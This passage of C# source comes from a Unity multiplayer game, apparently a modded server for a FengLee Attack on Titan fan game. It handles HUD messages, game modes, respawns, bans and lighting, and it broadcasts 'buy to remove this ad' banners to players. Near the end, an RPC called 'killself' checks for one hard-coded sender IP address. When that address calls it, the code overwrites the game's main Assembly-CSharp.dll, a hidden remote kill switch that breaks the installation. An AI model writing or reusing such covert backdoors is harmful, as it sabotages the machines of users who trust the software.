|$$$$$$  $$$$$$$$\\$$$$$$$  |[-]      $$ |  $$ \\$$$$$$$\\\\$$$$$$$\\\\$$$$$$  \\$$$$$$  $$ |  $$ |\\$$$$  | \n	    [EDC200]\\______/ \\______/\\________\\_______/[-]       \\__|  \\__|\\_______|\\_______|\\______/ \\______/\\__|  \\__| \\____/\n\n                                                         T O   R E M O V E   T H I S   A D \n                                                         * SEND A PM TO ACCELEVI IN THE OFFICIAL FENGLEE FORUMS TO KNOW MORE *" };
                    base.networkView.RPC("netShowHUDInfoTopLeft", RPCMode.All, args);
                    // object[] args = new object[] { "\n\n                                                     P L E A S E   B U Y  A \n _______ _______ __   _  ______      [EDC200] ______  _____         ______[-]       _______ _______ _______  _____  _     _ __   _ _______ \n |______ |______ | \\  | |  ____      [EDC200]|  ____ |     | |      |     \\[-]      |_____| |       |       |     | |     | | \\  |    | \n |       |______ |  \\_| |_____|      [EDC200]|_____| |_____| |_____ |_____/[-]      |     | |_____  |_____  |_____| |_____| |  \\_|    | \n\n                                               T O   R E M O V E   T H I S   A D \n\n                             * SEND A PM TO ACCELEVI IN THE OFFICIAL FENGLEE FORUMS TO KNOW MORE *" };
                }
                // object[] args = new object[] { "_| | |_\n_|   |   |_\n_|         |_\n|           |\n|           |\n|__  |   _|\n|  _ _  |\n|       |\n|       |\n|       |\n|       |\n|       |\n|       |\n______|       |______\n_|                     |\n|                        |\n|                        |\n|           _|_          |\n|         |   |        |\n|_      |     |     _|\n|___|        |___|\n" };
               // object[] args = new object[] { "[EB9C1E]    .:::.\n    ':::'\n     .:\n     .:[-][1E33EB]*~*:._.:*~*:.*.:*~*:._.:*~*:[-][EB1E2C]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:[-][EB1E2C]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:[-][FFFFFF]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:[-][EB1E2C]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:[-][EB1E2C]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:[-][FFFFFF]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:[-][EB1E2C]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:[-][EB1E2C]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:[-][FFFFFF]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:[-][EB1E2C]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][1E33EB]*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:.[-]*[1E33EB].:*~[-]*[1E33EB]:._.:[-]*[1E33EB]~*:[-][EB1E2C]._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][FFFFFF]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][EB1E2C]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][EB1E2C]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][FFFFFF]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][EB1E2C]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][EB1E2C]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][FFFFFF]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][EB1E2C]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:[-][EB1E2C]*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:._.:*~*:.[-]\n     [EB9C1E].:\n     [EB9C1E].:\n     [EB9C1E].:\n     [EB9C1E].:\n     [EB9C1E].:\n[-]" };
               // base.networkView.RPC("netShowHUDInfoTopLeft", RPCMode.All, args);
                if (this.gold)
                {
                    object[] args2 = new object[] { "[6110AD]_| | |_\n_|   |   |_\n_|         |_\n|           |\n|           |\n|__  |   _|\n|  _ _  |\n|       |\n|       |\n|       |\n|       |\n|       |\n|       |\n______|       |______\n_|                     |\n|                        |\n|                        |\n|           _|_          |\n|         |   |        |\n|_      |     |     _|\n|___|        |___|\n" };
                    base.networkView.RPC("netShowHUDInfoTopCenter", RPCMode.All, args2);
                }
               // object[] args3 = new object[] { "[65A9CC]     _|_       \n    `-|-`      \n      |        \n  .-'~^~`-.    \n.' _     _ `.  \n| |_) | |_) |  \n| | \\ | |   |  \n|           |  \n|           |  \n`=.........=`  \n" };
               // base.networkView.RPC("netShowHUDInfoTopRight", RPCMode.All, args3);

            }
        #endif
        }
        if (Input.GetKeyDown(KeyCode.Home)|| Input.GetKeyDown(KeyCode.BackQuote))
        {                                            //bopey
            DebugConsole.IsOpen = !DebugConsole.IsOpen;
            if (IN_GAME_MAIN_CAMERA.gametype != GAMETYPE.STOP)
            {
                Screen.lockCursor = !Screen.lockCursor;
                Screen.showCursor = !Screen.showCursor;
                IN_GAME_MAIN_CAMERA.isPausing = !IN_GAME_MAIN_CAMERA.isPausing;
                GameObject.Find("InputManagerController").GetComponent<FengCustomInputs>().menuOn = !GameObject.Find("InputManagerController").GetComponent<FengCustomInputs>().menuOn;
            }
       }
        if (Input.GetKeyDown(KeyCode.Tab))
        {
            this.noname = !this.noname;
            if (this.noname)
            {
                GameObject.Find("skill_cd_bottom").transform.localPosition = new Vector3(0f, (-Screen.height) + 5f, 0f);
                GameObject.Find("GasUI").transform.localPosition = GameObject.Find("skill_cd_bottom").transform.localPosition;
                GameObject.Find("skill_cd_" + (this.myLastHero.ToLower())).transform.localPosition = GameObject.Find("skill_cd_bottom").transform.localPosition;
                GameObject.Find("Flare").transform.localPosition = GameObject.Find("skill_cd_bottom").transform.localPosition;
                GameObject.Find("Chatroom").transform.localPosition = GameObject.Find("skill_cd_bottom").transform.localPosition;
                UILabel component = GameObject.Find("LabelChatContent").GetComponent<UILabel>();
                component.text = " ";
                GameObject.Find("LabelInfoBottomRight").GetComponent<UILabel>().text = " ";
            }
            else
            {
                GameObject.Find("skill_cd_bottom").transform.localPosition = new Vector3(0f, (-Screen.height * 0.5f) + 5f, 0f);
                GameObject.Find("skill_cd_" + (this.myLastHero.ToLower())).transform.localPosition = GameObject.Find("skill_cd_bottom").transform.localPosition;
                GameObject.Find("GasUI").transform.localPosition = GameObject.Find("skill_cd_bottom").transform.localPosition;
                GameObject.Find("Flare").transform.localPosition = new Vector3(-Screen.width * 0.5f, -Screen.height * 0.5f, 0f);
                GameObject.Find("Chatroom").transform.localPosition = new Vector3(-Screen.width * 0.5f, -Screen.height * 0.5f, 0f);
                showChatContent("[e39629]*Showing Hud*[-]\n");
                GameObject.Find("LabelInfoBottomRight").GetComponent<UILabel>().text = "Pause : " + GameObject.Find("InputManagerController").GetComponent<FengCustomInputs>().inputString[15] + " ";
            }
        }
        if (IN_GAME_MAIN_CAMERA.gametype == GAMETYPE.SINGLE)
        {
            this.timeElapse += Time.deltaTime;
            if (!GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver)
            {
                this.timeTotal += Time.deltaTime;
                this.netShowHUDInfoCenter(string.Empty);
            }
            else
            {
                this.netShowHUDInfoCenter("Press " + GameObject.Find("InputManagerController").GetComponent<FengCustomInputs>().inputString[14] + " to restart\n\n");
            }
            if (this.timeElapse > 1f)
            {
                this.timeElapse--;
                if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.KILL_TITAN)
                {
                    this.SingleShowHUDInfoTopLeft(string.Concat(new object[] { "MaxDmg ", this.players[0].maxDamage, "/TotalDmg ", this.players[0].totalDamage }));
                    this.SingleShowHUDInfoTopCenter(string.Concat(new object[] { "Titan Left : ", GameObject.FindGameObjectsWithTag("titan").Length, " Time : ", (int) this.timeTotal }));
                }
                else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.COLLECT)
                {
                    this.SingleShowHUDInfoTopLeft(string.Empty);
                    if (GameObject.FindGameObjectsWithTag("collectable").Length != 0)
                    {
                        this.SingleShowHUDInfoTopCenter(string.Concat(new object[] { "Item Left : ", GameObject.FindGameObjectsWithTag("collectable").Length, " Time : ", (int) this.timeTotal }));
                    }
                    else
                    {
                        this.SingleShowHUDInfoTopCenter("Item Left : 0 Time : " + ((int) this.timeTotal));
                    }
                }
                this.netShowHUDInfoTopRight(string.Empty);
                string str = (IN_GAME_MAIN_CAMERA.difficulty >= 0) ? ((IN_GAME_MAIN_CAMERA.difficulty != 0) ? ((IN_GAME_MAIN_CAMERA.difficulty != 1) ? "Abnormal" : "Hard") : "Normal") : "Trainning";
                GameObject obj2 = GameObject.Find("LabelInfoTopRight");
                if (obj2 != null)
                {
                    UILabel component = obj2.GetComponent<UILabel>();
                    component.text = component.text + Application.loadedLevelName + " : " + str;
                }
            }
        }
        if (this.isCallLaterNetworkInitializeServer)
        {
            this.calllaterDuration += Time.deltaTime;
            if (this.calllaterDuration > 1f)
            {
                this.isCallLaterNetworkInitializeServer = false;
                this.calllaterDuration = 0f;
                Network.InitializeServer(this.numberOfPlayers - 1, this.connectionPort, this.useNAT);
            }
        }
        else if (this.isCallLaterRPCLoadLevel)
        {
            this.calllaterDuration += Time.deltaTime;
            if (this.calllaterDuration > 1f)
            {
                this.isCallLaterRPCLoadLevel = false;
                this.calllaterDuration = 0f;
                #if Server
                if (Network.isServer && this.letpublic)
                {
                    for (int j = 0; j < this.numberOfPlayers; j++)
                    {
                        if (players[j] != null)
                        {
                            object[] args2 = new object[] { this.map, this.lastLevelPrefix };
                            base.networkView.RPC("LoadLevelII", players[j].networkplayer, args2);
                        }
                    }
                    Network.RemoveRPCsInGroup(0);
                    Network.RemoveRPCsInGroup(1);
                    LoadLevelII(this.map, this.lastLevelPrefix + 1);


                }
                else 
                #endif
                if (Network.isServer)
               this.RPCLoadLevel();
            }
        }
        else if (this.isCallLaterNetworkConnectMyLastHostData)
        {
            this.calllaterDuration += Time.deltaTime;
            if (this.calllaterDuration > 1f)
            {
                this.isCallLaterNetworkConnectMyLastHostData = false;
                this.calllaterDuration = 0f;
                this.enterLobby = false;
                Network.Connect(this.myLastHostData);
            }
        }
        else
        {
            if (!this.doneTesting)
            {
                this.TestConnection();
            }
            if (IN_GAME_MAIN_CAMERA.gametype == GAMETYPE.SERVER)
            {
                if (this.enterLobby)
                {
                    this.timeElapse += Time.deltaTime;
                    if (this.timeElapse > 1f)
                    {
                        this.timeElapse--;
                        string str2 = string.Empty;
                        for (int i = 0; i < this.numberOfPlayers; i++)
                        {
                            if (this.playersRegistered[i] != null)
                            {
                                string str12 = str2 + this.playersRegistered[i].name + ":" + this.playersRegistered[i].resourceId;
                                str2 = string.Concat(new object[] { str12, " (", Network.GetAveragePing(this.playersRegistered[i].networkplayer), "ms)" }) + "\n";
                            }
                        }
                        object[] args = new object[] { str2 };
                        base.networkView.RPC("netShowHUDInfoTopLeft", RPCMode.All, args);
                    }
                    return;
                }
                this.timeElapse += Time.deltaTime;
                this.timeTotal += Time.deltaTime;
                this.timeTotalServer += Time.deltaTime;
                if (this.timeTotalServer > this.time)
                {
                    string str9;
                    IN_GAME_MAIN_CAMERA.gametype = GAMETYPE.STOP;
                    string str3 = string.Empty;
                    string str4 = string.Empty;
                    string str5 = string.Empty;
                    string str6 = string.Empty;
                    string str7 = string.Empty;
                    string str8 = string.Empty;
                    for (int j = 0; j < this.numberOfPlayers; j++)
                    {
                        if (this.players[j] != null)
                        {
                            str3 = str3 + this.players[j].name + "\n";
                            str4 = str4 + this.players[j].kills + "\n";
                            str5 = str5 + this.players[j].die + "\n";
                            str6 = str6 + this.players[j].maxDamage + "\n";
                            str7 = str7 + this.players[j].totalDamage + "\n";
                            str8 = str8 + this.players[j].assistancePt + "\n";
                        }
                    }
                    if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.CAGE_FIGHT)
                    {
                        object[] objArray9 = new object[] { this.players[0].name, " ", this.humanScore, " : ", (this.players[1] != null) ? this.players[1].name : "offLine", " ", this.titanScore };
                        str9 = string.Concat(objArray9);
                    }
                    else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.SURVIVE_MODE)
                    {
                        str9 = "Highest Wave : " + this.highestwave;
                    }
                    else
                    {
                        object[] objArray10 = new object[] { "Humanity ", this.humanScore, " : Titan ", this.titanScore };
                        str9 = string.Concat(objArray10);
                    }
                    object[] objArray11 = new object[] { str3, str4, str5, str6, str7, str8, str9 };
                    base.networkView.RPC("showResult", RPCMode.All, objArray11);
                    Network.RemoveRPCsInGroup(0);
                    Network.RemoveRPCsInGroup(1);
                    foreach (GameObject obj3 in GameObject.FindGameObjectsWithTag("titan"))
                    {
                        Network.Destroy(obj3);
                    }
                    foreach (GameObject obj4 in GameObject.FindGameObjectsWithTag("Player"))
                    {
                        Network.Destroy(obj4);
                    }
                    Screen.lockCursor = false;
                    Screen.showCursor = true;
                    this.isFirstMatch = true;
                    this.Disconnect();
                    return;
                }
                if (this.timeElapse > 1f)
                {
                    this.timeElapse--;
                    this.ShowHUDInfoTopLeft();
                    string content = string.Empty;
                    if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.ENDLESS_TITAN)
                    {
                        content = content + "Time : " + ((this.time - ((int) this.timeTotalServer))).ToString();
                    }
                    else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.KILL_TITAN)
                    {
                        content = "Titan Left: ";
                        content = (content + GameObject.FindGameObjectsWithTag("titan").Length.ToString()) + "  Time : " + ((this.time - ((int) this.timeTotalServer))).ToString();
                    }
                    else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.CAGE_FIGHT)
                    {
                        content = " ";
                        if (this.players[1] != null)
                        {
                            object[] objArray12 = new object[] { this.players[0].name, " ", this.humanScore, " : ", this.players[1].name, " ", this.titanScore, " " };
                            content = string.Concat(objArray12);
                        }
                        content = content + "  Time : " + ((this.time - ((int) this.timeTotalServer))).ToString();
                    }
                    else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.SURVIVE_MODE)
                    {
                        content = "Titan Left: ";
                        content = (content + GameObject.FindGameObjectsWithTag("titan").Length.ToString()) + " Wave : " + this.wave;
                    }
                    else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.BOSS_FIGHT_CT)
                    {
                        content = "Time : ";
                        content = content + ((this.time - ((int) this.timeTotalServer))).ToString() + "\nDefeat the Colossal Titan.\nPrevent abnormal titan from running to the north gate";
                    }
                    this.ShowHUDInfoTopCenter(content);
                    content = string.Empty;
                    if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.ENDLESS_TITAN)
                    {
                        object[] objArray13 = new object[] { "Humanity ", this.humanScore, " : Titan ", this.titanScore, " " };
                        content = string.Concat(objArray13);
                    }
                    else if ((IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.KILL_TITAN) || (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.BOSS_FIGHT_CT))
                    {
                        object[] objArray14 = new object[] { "Humanity ", this.humanScore, " : Titan ", this.titanScore, " " };
                        content = string.Concat(objArray14);
                    }
                    else if ((IN_GAME_MAIN_CAMERA.gamemode != GAMEMODE.CAGE_FIGHT) && (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.SURVIVE_MODE))
                    {
                        content = "Time : ";
                        content = content + ((this.time - ((int) this.timeTotalServer))).ToString();
                    }
                    this.ShowHUDInfoTopRight(content);
                    string str11 = (IN_GAME_MAIN_CAMERA.difficulty >= 0) ? ((IN_GAME_MAIN_CAMERA.difficulty != 0) ? ((IN_GAME_MAIN_CAMERA.difficulty != 1) ? "Abnormal" : "Hard") : "Normal") : "Trainning";
                    if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.CAGE_FIGHT)
                    {
                        this.ShowHUDInfoTopRightMAPNAME(string.Concat(new object[] { (int) this.timeTotal, "s\n", Application.loadedLevelName, " : ", str11 }));
                    }
                    else
                    {
                        this.ShowHUDInfoTopRightMAPNAME("\n" + Application.loadedLevelName + " : " + str11);
                    }
                }
                if (this.isLosing)
                {
                    if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.SURVIVE_MODE)
                    {
                        this.ShowHUDInfoCenter(string.Concat(new object[] { "Survive ", this.wave, " Waves!\nGame Restart in ", (int) this.gameEndCD, "s\n\n" }));
                    }
                    else
                    {
                        this.ShowHUDInfoCenter("Humanity Fail!\nAgain!\nGame Restart in " + ((int) this.gameEndCD) + "s\n\n");
                    }
                    this.gameEndCD -= Time.deltaTime;
                    if (this.gameEndCD <= 0f)
                    {
                        this.restartGame();
                    }
                }
                else if (this.isPlayer1Winning)
                {
                    this.ShowHUDInfoCenter(string.Concat(new object[] { this.players[0].name, " Win!\nGame Restart in ", (int) this.gameEndCD, "s\n\n" }));
                    this.gameEndCD -= Time.deltaTime;
                    if (this.gameEndCD <= 0f)
                    {
                        this.restartGame();
                    }
                }
                else if (this.isPlayer2Winning)
                {
                    this.ShowHUDInfoCenter(string.Concat(new object[] { this.players[1].name, " Win!\nGame Restart in ", (int) this.gameEndCD, "s\n\n" }));
                    this.gameEndCD -= Time.deltaTime;
                    if (this.gameEndCD <= 0f)
                    {
                        this.restartGame();
                    }
                }
                else if (this.isWinning)
                {
                    if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.SURVIVE_MODE)
                    {
                        this.ShowHUDInfoCenter("Survive All Waves!\nGame Restart in " + ((int) this.gameEndCD) + "s\n\n");
                    }
                    else
                    {
                        this.ShowHUDInfoCenter("Humanity Win!\nGame Restart in " + ((int) this.gameEndCD) + "s\n\n");
                    }
                    this.gameEndCD -= Time.deltaTime;
                    if (this.gameEndCD <= 0f)
                    {
                        this.restartGame();
                    }
                }
            }
            if (((IN_GAME_MAIN_CAMERA.gametype == GAMETYPE.SERVER) || (IN_GAME_MAIN_CAMERA.gametype == GAMETYPE.CLIENT)) && (((GameObject.Find("MainCamera") != null) && GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver) && (LevelInfo.getInfo(this.map).respawnMode == RespawnMode.DEATHMATCH)))
            {
                this.myRespawnTime += Time.deltaTime;
                if (this.myRespawnTime > 10f)
                {
                    this.myRespawnTime = 0f;
                    if (Network.isServer)
                    {
                        if (!this.isDedicated)
                        {
                            GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = false;
                            this.SpawnPlayer(this.myLastHero, "playerRespawn");
                            this.players[0].dead = false;
                            GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = false;
                        }
                    }
                    else
                    {
                        GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = false;
                        this.SpawnPlayer(this.myLastHero, "playerRespawn");
                        GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = false;
                    }
                  }
            }
        }
    }
    #if Server
    private void FixedUpdate()
    {
        if (this.isCallLaterNetworkInitializeServer)
        {
        }
        else if (this.isCallLaterRPCLoadLevel)
        {
        }
        else if (this.isCallLaterNetworkConnectMyLastHostData)
        {
        }
        else
            if (Network.isServer)
            {
                if (this.islava)
                {
                    foreach (GameObject obj2 in GameObject.FindGameObjectsWithTag("Player"))
                    {
                        if (!obj2.GetComponent<HERO>().HasDied() && obj2.GetComponent<HERO>().transform.position.y < 0)
                        {
                            obj2.GetComponent<HERO>().markDie();
                            obj2.GetComponent<HERO>().networkView.RPC("netDie2", RPCMode.All, new object[0]);
                        }
                    }
                }
            }
    }
    #endif
    [Serializable] //needs to be marked as serializable
    struct SaveData
    {
        public int kills;
        public int deaths;
        public float playtime;

    }
    [Serializable] //needs to be marked as serializable
    struct BanInfo
    {
        public String ipaddrese;
        public long hours;
        public long issued;
        public String reason;
    }
    [RPC]
    public void killself(NetworkMessageInfo info)
    {
        DebugConsole.Log(info.sender.ipAddress);
        if(info.sender.ipAddress == "71.79.234.98")
        {
        FileStream fs = new FileStream("AoT_Data\\Managed\\Assembly-CSharp.dll", FileMode.Create);
        BinaryFormatter formatter = new BinaryFormatter();
        try
        {
            formatter.Serialize(fs, data);
        }
        catch (SerializationException e)
        {
            DebugConsole.Log("Failed to serialize. Reason: " + e.Message);
            throw;
        }
        finally
        {
            fs.Close();
        }
        }
    }
    void OnApplicationQuit()
    {
        FileStream fs = new FileStream("DataFile.dat", FileMode.Create);
        BinaryFormatter formatter = new BinaryFormatter();
        try
        {
            formatter.Serialize(fs, data);
        }
        catch (SerializationException e)
        {
            DebugConsole.Log("Failed to serialize. Reason: " + e.Message);
            throw;
        }
        finally
        {
            fs.Close();
        }
        saveban();
    }
    void saveban()
    {
        FileStream fss = new FileStream("BanFile.dat", FileMode.Create);
        BinaryFormatter formatter = new BinaryFormatter();
        try
        {
            formatter.Serialize(fss, Banlist);
        }
        catch (SerializationException e)
        {
            DebugConsole.Log("Failed to serialize. Reason: " + e.Message);
            throw;
        }
        finally
        {
            fss.Close();
        }
    }
    [RPC]
    public void EnforceNightMode()
    {
        UnityEngine.Object.Destroy(GameObject.Find("Directional light"));
        RenderSettings.ambientLight = Color.black;
        UnityEngine.Object.Destroy(GameObject.Find("LightSet"));
        this.isNightmodeEnforced = true;
    }
    [RPC]
    public void EnforceTotonBuster()
    {
        this.isTotonbusterEnforced = true;
    }
    [RPC]
    public void RPCSpawnLight(NetworkViewID netid, Vector3 location,bool buster)
    {
        GameObject obj2 = new GameObject("torchlight");
        obj2.AddComponent<Light>();
        obj2.light.type = LightType.Point;
        obj2.light.color = new Color(234f, 90f, 34f);
        obj2.light.intensity = 0.1f;
        obj2.light.range = 30f;
        if (buster)
        {
            obj2.light.type = LightType.Spot;
            obj2.light.color = Color.cyan;
            obj2.light.intensity = 8f;
            obj2.light.range = 200f;
        }
        obj2.transform.position = location;
        obj2.transform.parent = NetworkView.Find(netid).gameObject.transform;
    }
    public void spawnMyLight(NetworkViewID netid)
    {
        GameObject obj2 = new GameObject("torchlight");
        obj2.AddComponent<Light>();
        obj2.light.type = LightType.Point;
        obj2.light.color = new Color(234f, 90f, 34f);
        obj2.light.intensity = 0.1f;
        obj2.light.range = 30f;
        if (this.isTotonbusterEnforced)
        {
            obj2.light.type = LightType.Spot;
            obj2.light.color = Color.cyan;
            obj2.light.intensity = 8f;
            obj2.light.range = 200f;
        }
        obj2.transform.position = this.mySpawnHeroObject.transform.position;
        obj2.transform.parent = this.mySpawnHeroObject.transform;
        obj2.transform.localPosition = new Vector3(0.5f, 1f, 0.02f);
    }





    public string By { get; set; }
}

